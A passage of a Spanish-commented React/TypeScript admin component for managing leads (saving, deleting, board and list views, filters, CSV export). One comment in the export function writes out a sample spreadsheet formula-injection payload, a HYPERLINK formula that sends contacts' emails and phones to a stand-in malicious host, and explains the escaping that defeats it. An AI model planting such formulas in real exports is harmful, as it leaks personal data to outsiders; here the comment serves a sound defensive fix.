    } catch {
      // Se deshace y se avisa: dejar la pantalla diciendo «contactado» cuando
      // no se ha guardado es peor que no haber dejado pulsar.
      setLista(
        (l) =>
          l?.map((c) =>
            c.id === id ? { ...c, estado: estadoAntes ?? c.estado, situacion: situacionAntes ?? c.situacion } : c
          ) ?? l
      );
      setFallo('No se ha podido guardar el cambio. Vuelve a intentarlo.');
      return false;
    }
  }

  /** Apunta algo de una persona. Se recarga para que la ficha lo enseñe ya. */
  async function apuntar(id: string, texto: string) {
    const r = await fetch('/api/contactos', {
      method: 'PATCH',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ id, nota: texto }),
    });
    if (!(await r.json().catch(() => ({ ok: false }))).ok) {
      throw new Error('No se ha podido guardar la nota.');
    }
    await cargar();
  }

  /**
   * Guarda lo que venga del panel: un contacto nuevo o la corrección de uno.
   *
   * Los dos casos acaban en la misma ruta y se diferencian en el método, así
   * que se resuelven aquí juntos. Los errores de campo vuelven al panel para
   * que los pinte al lado de lo que falla; los demás, como un texto suelto.
   */
  async function guardar(cuerpo: Record<string, unknown>): Promise<Resultado> {
    if (!modo) return { ok: false, errores: {} };
    const corrigiendo = modo.que === 'editar';

    try {
      const r = await fetch('/api/contactos', {
        method: corrigiendo ? 'PATCH' : 'POST',
        headers: { 'Content-Type': 'application/json' },
        // Al corregir, lo que cambia va envuelto en `datos`: suelto en la raíz
        // chocaría con `nota`, que ahí significa «apunta esta nota de
        // seguimiento» y no «este es el texto de su ficha».
        body: JSON.stringify(corrigiendo ? { id: modo.contacto.id, datos: cuerpo } : cuerpo),
      });
      const c = await r.json().catch(() => ({ ok: false }));

      if (!c.ok) {
        const errores: Record<string, string> = c.errores ?? {};
        return {
          ok: false,
          errores,
          duplicado: c.motivo === 'ya-existe' ? c.id : undefined,
          // Si el servidor no dice qué campo falla, es que el problema no está
          // en lo escrito y hay que contarlo con palabras.
          fallo: Object.keys(errores).length ? undefined : motivoEnPalabras(c.motivo),
        };
      }

      setModo(null);
      /*
       * Al apuntar a alguien nuevo se le manda la información de la Técnica
       * Divine: el mismo correo que recibe quien la pide desde la
       * portada. El servidor contesta si salió, y aquí se dice, porque son dos
       * situaciones muy distintas para Sorela: si salió, esa persona ya tiene
       * la información y ella puede llamarla sabiéndolo; si no salió —porque
       * lo apuntó solo con el móvil, o porque Google falló—, tiene que
       * escribirle ella o la persona se queda esperando algo que no llega.
       */
      setAviso(
        corrigiendo
          ? 'Ficha corregida.'
          : c.correo
            ? 'Apuntado, y le acaba de salir el correo con la información.'
            : cuerpo.pidioInformacion
              ? 'Apuntado. El correo con la información NO ha salido: escríbele tú.'
              : 'Apuntado. No se le ha mandado ningún correo.'
      );
      await cargar();
      return { ok: true };
    } catch {
      return { ok: false, errores: {}, fallo: 'No hay conexión con el servidor.' };
    }
  }

  /**
   * Borrar a alguien de la lista.
   *
   * El botón está en la fila y no dentro de la ficha, que es donde pedía estar:
   * FichaPersona no recibe ningún aviso de borrado y añadírselo significaba
   * tocar un fichero que ahora mismo lleva otra mano. Queda anotado.
   *
   * Se pregunta antes, y la pregunta dice lo que de verdad se pierde: el
   * contacto se borra con todo su seguimiento, que es lo más caro que hay aquí.
   */
  async function borrar(c: Contacto) {
    const quien = c.nombre || 'este contacto';
    if (
      !window.confirm(
        `¿Borrar a ${quien}? Se va con él todo lo que tengas apuntado de vuestras conversaciones. No se puede deshacer.`
      )
    ) {
      return;
    }

    // Se guarda la fila y su sitio, no la lista entera: al fallar vuelve donde
    // estaba y lo demás se queda como esté, que puede haber cambiado.
    const donde = lista?.findIndex((x) => x.id === c.id) ?? -1;
    setAviso(null);
    setLista((l) => l?.filter((x) => x.id !== c.id) ?? l);
    try {
      const r = await fetch(`/api/contactos?id=${encodeURIComponent(c.id)}`, { method: 'DELETE' });
      if (!(await r.json().catch(() => ({ ok: false }))).ok) throw new Error();
      setFallo(null);
      setAviso(`${quien} ya no está en la lista.`);
    } catch {
      setLista((l) => {
        if (!l || l.some((x) => x.id === c.id)) return l;
        const vuelta = [...l];
        vuelta.splice(donde < 0 ? vuelta.length : donde, 0, c);
        return vuelta;
      });
      setFallo('No se ha podido borrar. Vuelve a intentarlo.');
    }
  }

  /** Descarga la lista tal como se ve, para abrirla en una hoja de cálculo. */
  function exportar() {
    /* «Tal como se ve»: en la lista, la pestaña entera (no solo las filas ya
       pintadas); en el tablero, todo lo que pasa los filtros. */
    const aExportar = vista === 'lista' ? enPestana : visibles;
    if (!aExportar.length) return;
    const cabecera = ['Fecha', 'Nombre', 'Correo', 'Teléfono', 'Ciudad', 'A qué se dedica', 'De dónde viene', 'Estado', 'Nota'];
    /*
     * Escapar un campo del CSV son DOS cosas, no una.
     *
     * La primera, las comillas dobles: se duplican, o una nota con comillas
     * parte la fila en dos al abrir el archivo.
     *
     * La segunda es la que importa de verdad. Excel y LibreOffice evalúan como
     * FÓRMULA cualquier celda que empiece por =, +, - o @, y entrecomillarla en
     * el CSV no lo impide. El texto de estos campos —nombre, ciudad, nota,
     * origen— lo escribe quien rellena el formulario de la portada, que es
     * cualquiera y sin cuenta. Alguien podía poner de nombre
     * `=HYPERLINK("https://sitio.malo/?d="&B2&C2,"Pincha aquí")`, esperar a que
     * Sorela descargara su lista, y de un clic suyo salían el correo y el
     * teléfono de las filas de al lado hacia un servidor de fuera. En
     * LibreOffice, WEBSERVICE() ni siquiera necesita el clic.
     *
     * El apóstrofo delante lo desactiva: la hoja lo lee como texto, no lo
     * enseña en la celda, y el dato se conserva entero.
     */
    const escapa = (v: string) => {
      const texto = String(v ?? '');
      const peligroso = /^[=+\-@\t\r]/.test(texto);
      return `"${(peligroso ? `'${texto}` : texto).replace(/"/g, '""')}"`;
    };
    /* La fecha, escrita como la escribiría una persona.
       Antes iba el ISO en crudo —«2026-09-23T10:12:33.000Z»—, que Excel no
       reconoce como fecha: ni se lee ni se puede ordenar por esa columna. Y va
       en hora de aquí, no en la Z, que además cae en el día anterior a partir
       de las dos de la madrugada. */
    const fecha = (iso: string | null) => {
      if (!iso) return '';
      const d = new Date(iso);
      return Number.isNaN(d.getTime())
        ? ''
        : d.toLocaleString('es-ES', {
            day: '2-digit',
            month: '2-digit',
            year: 'numeric',
            hour: '2-digit',
            minute: '2-digit',
          });
    };
    const filas = aExportar.map((c) =>
      [fecha(c.creado), c.nombre, c.correo, c.whatsapp, c.ciudad, c.perfil, c.origen, c.estado, c.nota]
        .map(escapa)
        .join(',')
    );
    // El BOM del principio es lo que hace que Excel abra las tildes bien.
    const csv = '﻿' + [cabecera.map(escapa).join(','), ...filas].join('\n');
    const url = URL.createObjectURL(new Blob([csv], { type: 'text/csv;charset=utf-8' }));
    const a = document.createElement('a');
    a.href = url;
    a.download = 'contactos-divine.csv';
    a.click();
    URL.revokeObjectURL(url);
  }

  const visibles = useMemo(() => {
    const t = busca.trim().toLowerCase();
    return (lista ?? []).filter(
      (c) =>
        (tipo === 'Todos' || c.tipo === tipo) &&
        (!deDonde || origenCorto(c.origen) === deDonde) &&
        (!deFuente || c.fuente === deFuente) &&
        (!t ||
          c.nombre.toLowerCase().includes(t) ||
          c.correo.toLowerCase().includes(t) ||
          c.ciudad.toLowerCase().includes(t))
    );
  }, [lista, tipo, busca, deDonde, deFuente]);

  /* Cuántas han entrado por cada sitio, de más a menos. Es la respuesta a «de
     dónde me llega la gente» sin abrir ninguna ficha. */
  const procedencias = useMemo(() => {
    const m = new Map<string, number>();
    for (const c of lista ?? []) {
      if (c.estado === 'Descartado') continue;
      const o = origenCorto(c.origen);
      m.set(o, (m.get(o) ?? 0) + 1);
    }
    return [...m.entries()].sort((a, b) => b[1] - a[1]);
  }, [lista]);

  /* Y desde qué red o buscador llegaron a la web, para las que lo sabemos
     (se apunta desde que existe esta versión: las de antes no lo tienen). */
  const fuentes = useMemo(() => {
    const m = new Map<string, number>();
    for (const c of lista ?? []) if (c.fuente) m.set(c.fuente, (m.get(c.fuente) ?? 0) + 1);
    return [...m.entries()].sort((a, b) => b[1] - a[1]);
  }, [lista]);

  /* Cuántas hay en cada grupo, ya con el buscador y los filtros puestos: el
     número de cada pestaña es lo que vas a encontrar al pulsarla. */
  const porGrupo = useMemo(() => {
    const m = new Map<Grupo, Contacto[]>();
    for (const c of visibles) {
      const g = grupoDe(c);
      const ya = m.get(g);
      if (ya) ya.push(c);
      else m.set(g, [c]);
    }
    return m;
  }, [visibles]);

  const cuentaPestana = (p: (typeof PESTANAS)[number]) =>
    p.grupos ? p.grupos.reduce((s, g) => s + (porGrupo.get(g)?.length ?? 0), 0) : visibles.length;

  const pestanaActiva =
    PESTANAS.find((p) => p.id === pestanaLista) ??
    PESTANAS.find((p) => p.id === ((porGrupo.get('te-necesita')?.length ?? 0) > 0 ? 'te-necesita' : 'todas'))!;

  /* Las de la pestaña, en su orden. En «Te necesitan» primero quien más
     lleva esperando, que es a quien hay que escribir antes; en las demás, la
     última que entró arriba, como llegan del servidor. */
  const enPestana = useMemo(() => {
    const grupos = pestanaActiva.grupos;
    const suyas = grupos ? visibles.filter((c) => grupos.includes(grupoDe(c))) : visibles;
    if (pestanaActiva.id !== 'te-necesita') return suyas;
    const desde = (c: Contacto) => {
      const t = Date.parse(c.situacion?.desde ?? c.creado ?? '');
      return Number.isNaN(t) ? Infinity : t;
    };
    return [...suyas].sort((a, b) => desde(a) - desde(b));
  }, [visibles, pestanaActiva]);

  /* Al cambiar de pestaña o de filtro se vuelve a la primera tanda: seguir
     con 400 filas pintadas de la búsqueda anterior no tiene sentido. */
  useEffect(() => {
    setCuantas(TANDA);
    setCuantasTablero({});
  }, [pestanaActiva.id, busca, tipo, deDonde, deFuente, vista]);

  const hayMas = enPestana.length > cuantas;

  /* Cargar la siguiente tanda al acercarse al final, sin tener que pulsar.
     El botón «Ver más» se queda igual por si el navegador no tiene
     IntersectionObserver o se navega con el teclado. */
  useEffect(() => {
    if (!centinela || !hayMas || typeof IntersectionObserver === 'undefined') return;
    const obs = new IntersectionObserver(
      (entradas) => {
        if (entradas.some((e) => e.isIntersecting)) setCuantas((n) => n + TANDA);
      },
      { rootMargin: '400px 0px' }
    );
    obs.observe(centinela);
    return () => obs.disconnect();
  }, [centinela, hayMas]);

  /** Cuántos filtros hay puestos, para decirlo en el botón aunque estén plegados. */
  const filtrosPuestos = (tipo !== 'Todos' ? 1 : 0) + (deDonde ? 1 : 0) + (deFuente ? 1 : 0);

  /* El tablero: tres columnas y nada más.
     «Hablando» junta «Contactado» y «En conversación»: para Sorela es el mismo
     momento —ya le ha escrito y está esperando o charlando—, y separarlos en
     dos columnas era obligarla a decidir algo que no le sirve. El estado fino
     se sigue guardando y se ve como una etiqueta pequeña en la tarjeta. */
  const COLUMNAS: { id: string; titulo: string; pista: string; estados: Estado[]; alSoltar: Estado }[] = [
    { id: 'atender', titulo: 'Por atender', pista: 'Nadie les ha escrito', estados: ['Nuevo'], alSoltar: 'Nuevo' },
    { id: 'hablando', titulo: 'Hablando', pista: 'Ya les has escrito', estados: ['Contactado', 'En conversación'], alSoltar: 'Contactado' },
    { id: 'cerrado', titulo: 'Cerrado', pista: 'Compraron o reservaron', estados: ['Cerrado'], alSoltar: 'Cerrado' },
  ];

  const siguiente = (e: Estado): Estado | null =>
    e === 'Nuevo' ? 'Contactado' : e === 'Contactado' || e === 'En conversación' ? 'Cerrado' : null;

  /* Mover y celebrar: al cerrar una venta la tarjeta brilla un momento. */
  const mover = (id: string, estado: Estado) => {
    if (estado === 'Cerrado') {
      setBrillo(id);
      setTimeout(() => setBrillo((b) => (b === id ? null : b)), 1400);
    }
    cambiarEstado(id, estado);
  };

  const descartados = visibles.filter((c) => c.estado === 'Descartado');
  const raros = visibles.filter((c) => !(ESTADOS as readonly string[]).includes(c.estado));

  const iniciales = (n: string) =>
    n
      .trim()
      .split(/\s+/)
      .slice(0, 2)
      .map((t) => t[0]?.toUpperCase() ?? '')
      .join('') || '·';

  /** Días que lleva esperando alguien sin respuesta: lo que pide atención. */
  const espera = (c: Contacto) =>
    c.estado === 'Nuevo' && c.creado ? Math.floor((Date.now() - new Date(c.creado).getTime()) / 86400000) : 0;

  /* El menú «⋯» de una persona. Lo comparten la tarjeta del tablero y la fila
     de la lista: editar, descartar y borrar no están en la ficha, y sin él
     la lista no tendría manera de hacerlo. */
  function opciones(c: Contacto) {
    return (
      <AnimatePresence>
        {menu === c.id && (
          <motion.div
            className={k.menu}
            role="menu"
            data-arriba={menuArriba ? '' : undefined}
            initial={{ opacity: 0, y: menuArriba ? 6 : -6, scale: 0.97 }}
            animate={{ opacity: 1, y: 0, scale: 1 }}
            exit={{ opacity: 0, y: -4 }}
            transition={{ duration: 0.16 }}
          >
            <button type="button" role="menuitem" onClick={() => { setMenu(null); setAbierta(c.id); }}>Ver ficha y notas</button>
            <button type="button" role="menuitem" onClick={() => { setMenu(null); setAviso(null); setModo({ que: 'editar', contacto: c }); }}>Editar datos</button>
            {c.estado === 'Contactado' && (
              <button type="button" role="menuitem" onClick={() => { setMenu(null); mover(c.id, 'En conversación'); }}>Marcar «en conversación»</button>
            )}
            {c.estado !== 'Nuevo' && c.estado !== 'Descartado' && (
              <button type="button" role="menuitem" onClick={() => { setMenu(null); mover(c.id, 'Nuevo'); }}>Volver a «por atender»</button>
            )}
            {c.estado !== 'Descartado' ? (
              <button type="button" role="menuitem" onClick={() => { setMenu(null); mover(c.id, 'Descartado'); }}>Descartar</button>
            ) : (
              <button type="button" role="menuitem" onClick={() => { setMenu(null); mover(c.id, 'Nuevo'); }}>Recuperar</button>
            )}
            <button type="button" role="menuitem" className={k.peligro} onClick={() => { setMenu(null); borrar(c); }}>Borrar</button>
          </motion.div>
        )}
      </AnimatePresence>
    );
  }

  /**
   * La pastilla de situación de una fila: qué toca con ella, en dos o tres
   * palabras, y un tono que solo se calienta cuando de verdad espera.
   *
   * Quien está en la lista de espera dice «En automático» y nunca «Esperando
   * N días»: le llegan solos los correos de la masterclass y Sorela no tiene
   * nada que hacer. Era justo lo que hacía que el tablero pareciera un
   * incendio con cientos de personas tranquilas dentro.
   */
  function pastillaDe(c: Contacto): { texto: string; tono: string; mini?: string } {
    const s = c.situacion;
    switch (grupoDe(c)) {
      case 'te-necesita': {
        const corto = s ? textoMotivo(s)?.corto ?? 'Te necesita' : 'Sin atender';
        /* `mini` es lo que cabe en el móvil: el motivo en una o dos palabras
           y los días en «d». El texto entero sigue en el ordenador. */
        const mini = s?.motivo ? MOTIVO_MINI[s.motivo] : corto;
        const dias = s ? diasEsperando(s.desde) : espera(c);
        return dias >= 2
          ? { texto: `${corto} · ${dias} días`, mini: `${mini} · ${dias} d`, tono: 'urgente' }
          : { texto: corto, mini, tono: 'necesita' };
      }
      case 'lista':
        return { texto: 'En automático', tono: 'auto' };
      case 'avisar':
        return { texto: 'Espera aviso', tono: 'neutro' };
      case 'hablando':
        return { texto: c.estado === 'En conversación' ? 'En conversación' : 'Le escribiste', tono: 'oro' };
      case 'cerrado':
        return { texto: 'Cerrado', tono: 'bien' };
      case 'descartado':
        return { texto: 'Descartado', tono: 'apagado' };
      default:
        return { texto: 'Sin correos', tono: 'apagado' };
    }
  }

  /**
   * Una fila de la lista compacta: una persona, una línea (dos en el móvil).
   *
   * Toda la fila abre la ficha, salvo lo que ya es un botón o un enlace
   * dentro de ella. El nombre es además un botón de verdad para quien va con
   * el teclado. Sin animaciones de entrada ni capas translúcidas: con cientos
   * de filas, cada efecto por fila se paga al hacer scroll.
   */
  function fila(c: Contacto) {
    const g = grupoDe(c);
    const { texto, tono, mini } = pastillaDe(c);
    /* El botón de avanzar solo cuando alguien espera respuesta. En la lista
       de espera, «Ya le escribí» invitaba a marcar a cientos de personas a
       las que nadie tiene que escribir. */
    const boton = g === 'te-necesita' ? (c.situacion ? botonDe(c.situacion) : 'Ya le escribí') : null;
    const meta = [origenCorto(c.origen), c.ciudad, cuando(c.creado)].filter(Boolean).join(' · ');
    return (
      <li
        key={c.id}
        className={l.fila}
        data-menu={menu === c.id ? '' : undefined}
        onClick={(e) => {
          if ((e.target as HTMLElement).closest('a,button,[role=menu]')) return;
          /* Si había un menú abierto, ya lo ha cerrado el pointerdown del
             documento; este clic abre la ficha igual. Antes se tragaba el
             clic y parecía que la fila no respondía. */
          setAbierta(c.id);
        }}
      >
        <span className={l.avatar} data-tipo={c.tipo} aria-hidden="true">
          {iniciales(c.nombre)}
        </span>
        <button type="button" className={l.nombre} onClick={() => setAbierta(c.id)}>
          {c.nombre || 'Sin nombre'}
        </button>
        <span className={l.meta} title={comoLlego(c.origen)}>
          {meta}
        </span>
        {/* Las dos versiones van en el HTML y el CSS elige: la entera en el
            ordenador, la corta en el móvil. El `title` deja leer la entera
            también ahí manteniendo el dedo o pasando el ratón. */}
        <span className={l.pastilla} data-tono={tono} title={texto}>
          <span className={l.pastillaEntera}>{texto}</span>
          <span className={l.pastillaCorta}>{mini ?? texto}</span>
        </span>
        <span className={l.acciones}>
          {c.whatsapp && (
            <a className={l.icono} data-canal="whatsapp" href={`https://wa.me/${c.whatsapp.replace(/\D/g, '')}`} target="_blank" rel="noopener noreferrer" aria-label={`WhatsApp a ${c.nombre}`} title="WhatsApp">
              <svg viewBox="0 0 24 24" width="14" height="14" fill="currentColor" aria-hidden="true"><path d="M12 2a10 10 0 0 0-8.6 15.1L2 22l5-1.3A10 10 0 1 0 12 2zm0 18.2a8.2 8.2 0 0 1-4.2-1.2l-.3-.2-3 .8.8-2.9-.2-.3A8.2 8.2 0 1 1 12 20.2zm4.5-6.1c-.2-.1-1.5-.7-1.7-.8s-.4-.1-.6.1-.7.8-.8 1-.3.2-.5.1a6.7 6.7 0 0 1-3.3-2.9c-.2-.4.3-.4.8-1.3.1-.2 0-.3 0-.5l-.8-1.8c-.2-.5-.4-.4-.6-.4h-.5a1 1 0 0 0-.7.3 3 3 0 0 0-.9 2.2 5.2 5.2 0 0 0 1.1 2.8 11.9 11.9 0 0 0 4.6 4c1.7.7 2.4.8 3.2.7a2.8 2.8 0 0 0 1.8-1.3 2.3 2.3 0 0 0 .2-1.3c-.1-.1-.3-.2-.5-.3z" /></svg>
            </a>
          )}
          {c.correo && (
            <a className={l.icono} href={`mailto:${c.correo}`} aria-label={`Correo a ${c.nombre}`} title={c.correo}>
              <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" strokeWidth="1.8" aria-hidden="true"><rect x="3" y="5" width="18" height="14" rx="2" /><path d="M3 7l9 6 9-6" /></svg>
            </a>
          )}
          {boton && (
            <button
              type="button"
              className={l.avanzar}
              onClick={() => {
                mover(c.id, 'Contactado');
                setAviso(`${c.nombre || 'Esa persona'} pasa a «Hablando».`);
              }}
              aria-label={`${boton}: ${c.nombre || 'este contacto'}`}
            >
              {boton}
            </button>
          )}
        </span>
        {/* El «⋯» va fuera de las acciones, en su propia casilla: en el
            móvil sube a la primera línea, al final del nombre, y deja la
            última entera para la pastilla y los botones. */}
        <span className={l.masHueco}>
          <button
            type="button"
            className={l.mas}
            aria-label={`Más opciones de ${c.nombre || 'este contacto'}`}
            aria-expanded={menu === c.id}
            data-menu-de={c.id}
            onClick={(e) => alternarMenu(c.id, e.currentTarget)}
          >
            <svg viewBox="0 0 24 24" width="15" height="15" fill="currentColor" aria-hidden="true"><circle cx="5" cy="12" r="1.8" /><circle cx="12" cy="12" r="1.8" /><circle cx="19" cy="12" r="1.8" /></svg>
          </button>
          {opciones(c)}
        </span>
      </li>
    );
  }

  /* Una función y no un componente: definido dentro, React lo vería como un
     componente nuevo en cada repintado y desmontaría la tarjeta a mitad de un
     arrastre. */
  function tarjeta(c: Contacto) {
    const sig = siguiente(c.estado);
    const dias = espera(c);
    return (
      <motion.div
        key={c.id}
        layout
        layoutId={`tarjeta-${c.id}`}
        initial={{ opacity: 0, scale: 0.96 }}
        animate={{ opacity: 1, scale: 1 }}
        exit={{ opacity: 0, scale: 0.96 }}
        transition={{ type: 'spring', stiffness: 420, damping: 34 }}
        className={k.hueco}
        data-menu={menu === c.id ? '' : undefined}
      >
        <article
          className={k.tarjeta}
          draggable
          onDragStart={(e) => {
            e.dataTransfer.setData('text/plain', c.id);
            e.dataTransfer.effectAllowed = 'move';
            setArrastrando(c.id);
          }}
          onDragEnd={() => setArrastrando(null)}
          data-arrastrando={arrastrando === c.id ? '' : undefined}
          data-brillo={brillo === c.id ? '' : undefined}
          data-tipo={c.tipo}
        >
          <div className={k.cabeza}>
            <span className={k.avatar} data-tipo={c.tipo} data-urgente={dias >= 2 ? '' : undefined} aria-hidden="true">
              {iniciales(c.nombre)}
            </span>
            <div className={k.quien}>
              <button type="button" className={k.nombre} onClick={() => setAbierta(c.id)}>
                {c.nombre || 'Sin nombre'}
              </button>
              <span className={k.meta}>
                <span className={k.puntoTipo} data-tipo={c.tipo} />
                {ETIQUETA_TIPO[c.tipo]}
                {c.ciudad && ` · ${c.ciudad}`}
              </span>
              {/* De dónde viene, siempre a la vista: por qué formulario entró
                  y, si se sabe, desde qué red llegó a la web. */}
              <span className={k.procedencia} title={comoLlego(c.origen)}>
                <svg viewBox="0 0 24 24" width="12" height="12" fill="none" stroke="currentColor" strokeWidth="2" aria-hidden="true"><path d="M12 21s-7-6.2-7-11.5A7 7 0 0 1 19 9.5C19 14.8 12 21 12 21z" /><circle cx="12" cy="9.5" r="2.5" /></svg>
                {origenCorto(c.origen)}
                {c.fuente && c.fuente !== 'Directo' && <b> · desde {c.fuente}</b>}
              </span>
            </div>
            <button
              type="button"
              className={k.mas}
              aria-label={`Más opciones de ${c.nombre || 'este contacto'}`}
              aria-expanded={menu === c.id}
              data-menu-de={c.id}
              onClick={(e) => alternarMenu(c.id, e.currentTarget)}
            >
              <svg viewBox="0 0 24 24" width="16" height="16" fill="currentColor"><circle cx="5" cy="12" r="1.8" /><circle cx="12" cy="12" r="1.8" /><circle cx="19" cy="12" r="1.8" /></svg>
            </button>
            {opciones(c)}
          </div>

          {c.nota && <p className={k.nota}>«{c.nota}»</p>}

          <div className={k.pie}>
            <span className={k.tiempo} data-urgente={dias >= 2 ? '' : undefined}>
              {dias >= 2 ? `Esperando ${dias} días` : cuando(c.creado)}
              {c.estado === 'En conversación' && ' · en conversación'}
            </span>
            <span className={k.iconos}>
              {c.whatsapp && (
                <a className={k.icono} data-canal="whatsapp" href={`https://wa.me/${c.whatsapp.replace(/\D/g, '')}`} target="_blank" rel="noopener noreferrer" aria-label={`WhatsApp a ${c.nombre}`} title="WhatsApp">
                  <svg viewBox="0 0 24 24" width="15" height="15" fill="currentColor"><path d="M12 2a10 10 0 0 0-8.6 15.1L2 22l5-1.3A10 10 0 1 0 12 2zm0 18.2a8.2 8.2 0 0 1-4.2-1.2l-.3-.2-3 .8.8-2.9-.2-.3A8.2 8.2 0 1 1 12 20.2zm4.5-6.1c-.2-.1-1.5-.7-1.7-.8s-.4-.1-.6.1-.7.8-.8 1-.3.2-.5.1a6.7 6.7 0 0 1-3.3-2.9c-.2-.4.3-.4.8-1.3.1-.2 0-.3 0-.5l-.8-1.8c-.2-.5-.4-.4-.6-.4h-.5a1 1 0 0 0-.7.3 3 3 0 0 0-.9 2.2 5.2 5.2 0 0 0 1.1 2.8 11.9 11.9 0 0 0 4.6 4c1.7.7 2.4.8 3.2.7a2.8 2.8 0 0 0 1.8-1.3 2.3 2.3 0 0 0 .2-1.3c-.1-.1-.3-.2-.5-.3z" /></svg>
                </a>
              )}
              {c.correo && (
                <a className={k.icono} href={`mailto:${c.correo}`} aria-label={`Correo a ${c.nombre}`} title={c.correo}>
                  <svg viewBox="0 0 24 24" width="15" height="15" fill="none" stroke="currentColor" strokeWidth="1.7"><rect x="3" y="5" width="18" height="14" rx="2" /><path d="M3 7l9 6 9-6" /></svg>
                </a>
              )}
              {sig && (
                <button
                  type="button"
                  className={k.avanzar}
                  data-a={sig}
                  onClick={() => mover(c.id, sig)}
                  aria-label={sig === 'Contactado' ? `Ya le escribí a ${c.nombre}` : `Cerrar a ${c.nombre}`}
                  title={sig === 'Contactado' ? 'Ya le escribí' : 'Cerrado: compró o reservó'}
                >
                  <span>{sig === 'Contactado' ? 'Ya le escribí' : 'Cerrar'}</span>
                  <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" strokeWidth="2.2">
                    {sig === 'Contactado' ? <path d="M5 12h14M13 6l6 6-6 6" strokeLinecap="round" strokeLinejoin="round" /> : <path d="M5 12.5l4.5 4.5L19 7.5" strokeLinecap="round" strokeLinejoin="round" />}
                  </svg>
                </button>
              )}
            </span>
          </div>
        </article>
      </motion.div>
    );
  }

  if (lista === null) {
    return (
      <div className={css.columna}>
        <p className={css.vacioTexto}>Cargando los contactos…</p>
      </div>
    );
  }

  const columnaMovil = COLUMNAS.find((col) => col.id === pestana) ?? COLUMNAS[0];
  const cuentaDe = (col: (typeof COLUMNAS)[number]) => visibles.filter((c) => col.estados.includes(c.estado)).length;
  const activos = COLUMNAS.reduce((s, col) => s + cuentaDe(col), 0);

  return (
    <div className={css.columna}>
      {/* Si la lista viene cortada, se dice cuántos hay y se ofrece traer más
          en vez de solo avisar: con mil personas de verdad, «se muestran los
          500 más recientes» dejaba a la otra mitad sin forma de llegar. */}
      {recortada && !fallo && (
        <p className={css.apunte} role="note">
          Se muestran los {lista.length} contactos más recientes: las pestañas y el buscador solo
          miran estos.{' '}
          {tope && tope.ahora < tope.maximo && (
            <button type="button" className={css.btnLinea} onClick={traerMas}>
              Traer los {Math.min(1000, tope.maximo - tope.ahora)} anteriores
            </button>
          )}
        </p>
      )}

      {fallo && (
        <p className={css.avisoFallo} role="alert">
          {fallo}{' '}
          <button type="button" className={css.btnLinea} onClick={cargar}>
            Reintentar
          </button>
        </p>
      )}

      <AnimatePresence>
        {aviso && (
          <motion.p
            className={css.avisoBien}
            role="status"
            initial={{ opacity: 0, y: -6 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0 }}
          >
            {aviso}
          </motion.p>
        )}
      </AnimatePresence>

      {/*
        * Una sola barra: buscar, filtros, cómo verlo y los dos botones.
        *
        * Antes los filtros iban en una línea aparte y, en el móvil, Lista /
        * Tablero, Añadir y Excel ocupaban otra cada uno: la primera persona
        * empezaba a media pantalla. Ahora en el móvil son dos líneas —el
        * buscador con Filtros, y debajo la vista con Añadir y Excel como
        * iconos— y en el ordenador una sola. El orden lo pone el CSS.
        */}
      <div className={`${k.barra} ${l.barra}`}>
        <label className={`${k.buscar} ${l.buscar}`}>
          <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" strokeWidth="1.8" aria-hidden="true"><circle cx="11" cy="11" r="7" /><path d="M16.5 16.5L21 21" strokeLinecap="round" /></svg>
          <input
            placeholder="Buscar por nombre, correo o ciudad"
            aria-label="Buscar contacto"
            value={busca}
            onChange={(e) => setBusca(e.target.value)}
          />
        </label>
        {/* Plegados: se usan de vez en cuando y abiertos empujaban a las
            personas media pantalla abajo. El número dice cuántos hay puestos
            para que no se olviden aunque estén cerrados. */}
        <button
          type="button"
          className={l.filtrosBoton}
          aria-expanded={verFiltros}
          aria-label={filtrosPuestos > 0 ? `Filtros (${filtrosPuestos} puestos)` : 'Filtros'}
          onClick={() => setVerFiltros((v) => !v)}
        >
          <svg viewBox="0 0 24 24" width="15" height="15" fill="none" stroke="currentColor" strokeWidth="1.9" aria-hidden="true"><path d="M4 6h16M7 12h10M10 18h4" strokeLinecap="round" /></svg>
          <span className={l.textoBoton}>Filtros</span>
          {filtrosPuestos > 0 && <span className={l.filtrosCuenta}>{filtrosPuestos}</span>}
        </button>
        <div className={l.vistas} role="group" aria-label="Cómo verlo">
          <button type="button" className={l.vistaBoton} aria-pressed={vista === 'lista'} onClick={() => elegirVista('lista')}>
            Lista
          </button>
          <button type="button" className={l.vistaBoton} aria-pressed={vista === 'tablero'} onClick={() => elegirVista('tablero')}>
            Tablero
          </button>
        </div>
        <div className={`${k.botones} ${l.botones}`}>
          <button
            type="button"
            className={`${k.nuevo} ${l.botonCompacto}`}
            aria-label="Añadir un contacto"
            onClick={() => {
              setAviso(null);
              setModo({ que: 'nuevo' });
            }}
          >
            <svg viewBox="0 0 24 24" width="15" height="15" fill="none" stroke="currentColor" strokeWidth="2.2" aria-hidden="true"><path d="M12 5v14M5 12h14" strokeLinecap="round" /></svg>
            <span className={l.textoBoton}>Añadir</span>
          </button>
          <button
            type="button"
            className={`${k.excel} ${l.botonCompacto}`}
            onClick={exportar}
            disabled={!(vista === 'lista' ? enPestana : visibles).length}
            aria-label="Descargar en Excel"
            title="Descargar en Excel"
          >
            <svg viewBox="0 0 24 24" width="15" height="15" fill="none" stroke="currentColor" strokeWidth="1.8" aria-hidden="true"><path d="M12 4v11M7 10l5 5 5-5M5 20h14" strokeLinecap="round" strokeLinejoin="round" /></svg>
            <span className={l.textoBoton}>Excel</span>
          </button>
        </div>
      </div>

      {verFiltros && (
        <div className={l.filtrosPanel}>
          {/* «Quitar filtros» vive aquí y no en la barra: en la barra
              empujaba a Lista / Tablero a otra línea en el móvil. */}
          {filtrosPuestos > 0 && (
            <button
              type="button"
              className={k.quitarFiltro}
              style={{ alignSelf: 'flex-start' }}
              onClick={() => {
                setTipo('Todos');
                setDeDonde(null);
                setDeFuente(null);
              }}
            >
              Quitar filtros
            </button>
          )}
          <div className={l.chipsFila} role="group" aria-label="Qué busca">
            <span className={l.chipsTitulo}>Qué busca</span>
            {/* «Quiere tratarse» (sesiones) y «Sin clasificar» solo salen si hay
                alguien así: hoy la web solo capta para la masterclass y el resto
                entra por un enlace a un curso o a la membresía. */}
            {(['Todos', ...TIPOS.filter((t) => (t !== 'otro' && t !== 'clienta') || lista.some((c) => c.tipo === t))] as const).map((t) => (
